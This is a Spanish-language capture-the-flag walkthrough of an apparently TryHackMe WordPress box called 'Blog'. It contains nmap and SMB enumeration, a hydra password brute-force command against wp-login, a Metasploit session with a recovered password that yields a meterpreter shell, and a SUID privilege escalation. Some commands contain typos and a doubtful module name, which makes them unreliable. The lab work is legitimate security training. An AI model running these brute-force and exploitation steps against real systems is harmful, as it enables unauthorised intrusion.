# Introducción

Billy Joel ha creado un blog en su propio ordenador para trabajar

Enumera la caja y encuentra las 2 flags

añade a /etc/hosts blog.thm

# Conectividad

![image](https://github.com/user-attachments/assets/1edfabed-d3c9-4d73-bf00-88cd30e23ceb)

# Enumeración

```
udo nmap -sCV -T4 --min-rate 4000 10.10.23.49
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-27 11:53 GMT
Nmap scan report for blog.thm (10.10.23.49)
Host is up (0.0014s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:4D:28:51:D4:6B (Unknown)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2025-01-27T11:53:54+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-01-27T11:53:54
|_  start_date: N/A
```

- 22 / SSH
- 80 / Http - Wordpress 5.0 / wp-admin
- 139
- 445 / smb

Vamos a enumerar primero los smb a ver si encontramos cosas interesantes o archivos y posteirormente irnos para la web

![image](https://github.com/user-attachments/assets/8ee189d5-f8a5-4d26-9b96-027e0a559997)

Encontramos un directorio un tanto extraño "BillySMB" vamos a ver si podemos enumerarlo

![image](https://github.com/user-attachments/assets/76bd8042-911c-423d-b016-4ad18ada599b)

Vamos a cogernos los archivos y meterles un exiftool y un steghide a ver si encontrmos algo interesante, y si no nos iremos al wordpress

Después de ir enumerando encontramos que si queremos extraer con steghide necesitaremos sacar contraseñas y que el mp4 es un tanto extaño, vamos a ir a enumerar la web a ver si encontramos cosas interesantes, además de que sabemos que es un wordpress y le podemos meter un wpscan de mientras

![image](https://github.com/user-attachments/assets/900c9269-4fbd-4d11-8964-30b5f71ecddc)

- Podemos ir enumerando el robots.txt
- también el Readme.txt

Con el wpsan encontramos directorios que no deberiamos tener acceso y esta guay para lo que podemos usar

- blog.thm/wp-content/uploads
- blog.thm/wp-cron.php
- La versión de twentytwenty esta desactualizada y también podemos ir tirando por ahi

Si seguimos enumerando encontramos que la persona que hace blogs se llama Karen Wheeler

```
http://blog.thm/author/kwheel/
```

Sacamos un usuario, con esto si quisieramos podriamos probar a meter un brute force con hydra o el mismo wpscan

```
wpscan --url http://blog.thm/ --usernames kwheel
```

Yo utilizare hydra al ser wordpress necesitaremos la cookie

```
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "/wp-login.php:[línea cookies modificada] -I
```

![image](https://github.com/user-attachments/assets/92d24165-c341-4d5f-810b-d2c5f9653003)

![image](https://github.com/user-attachments/assets/7ca05594-cf93-46fe-bad4-a85b8733ba47)

Ya dentro vamos a enumerar el wordpress a ver si encontramos cosas interesantes, ya sabiamos perfectamente que el tema esta desactualizado con lo cual vamos a intentar algo por ahi.

# Explotación

Enumerando en la web no encontramos muchas cosas intereantes vamos a ver si hay vulnerabilidades relacionadas al twentytwenty

Nos fijamos que versiones de Wordpress = o menores a 5.0.0 existe la crop-image que da al usuario privilegios, para meter un archivo y subirlo, el segundo paso es subir al template de la pagina y crear un post con un modulo para un rev shell.

```
use exploit/multi/http/wp_cron_rce
options
set RHOSTS blog.thm
set USERANME kwheel
SET PASSWORD cutiepie1
run
```

Una vez se suba la imagen tendremos una shell con meterpreter.

![image](https://github.com/user-attachments/assets/f2442bdf-6933-454f-81bd-40ab29e037d7)

Enumeramos el user.txt pero parece ser que no es ese

![image](https://github.com/user-attachments/assets/d05a62d1-a3ed-4f9c-8896-8f57091aec29)

# Escala Privilegios

Vamos a ir nos al archivo wp-config.php sabiendo que aporta bastante información pudiendo a ver hasta contraseñas

Sacamos unas credencailes de una db

![image](https://github.com/user-attachments/assets/4493c4cf-c473-43ff-b03c-cd96dea9df80)

Podriamos enumerar si existe dicha BD (existe)

Una vez dentro nos metemos a la db con dicho usuario y pass 

![image](https://github.com/user-attachments/assets/6e766aea-222d-4888-a4e8-c8bbe0bab94e)

![image](https://github.com/user-attachments/assets/0822feee-579c-45e8-a5b6-366f2ff075d4)

Vamos a sacar los hashes de los usuarios para pivotear entre ellos

![image](https://github.com/user-attachments/assets/0b3a786b-5ee7-4826-be9b-49de009b6efe)

Una vez vamos a utilzar hash-identifier pero tienen toda la pinta quie son md5

Pero nada no lo llegamos a crackear

Vamos a meter linpeas 

![image](https://github.com/user-attachments/assets/24d7b1ea-a60a-4fc5-9eac-6e6719478db2)

/usr/bin/checker

Si nos vamos a hacktricks encontramos un buen recurso para volvernos root con esta vuln

Con ltrace

![image](https://github.com/user-attachments/assets/620dd327-1fca-4ab9-a83c-5c3038fe6b14)

Vamos a exportar la variable admin  y ejecutar el checker

![image](https://github.com/user-attachments/assets/442b33d7-4a4c-4221-9e42-51d72a704c64)

GGG!!!!!!! ahora a buscar las flags


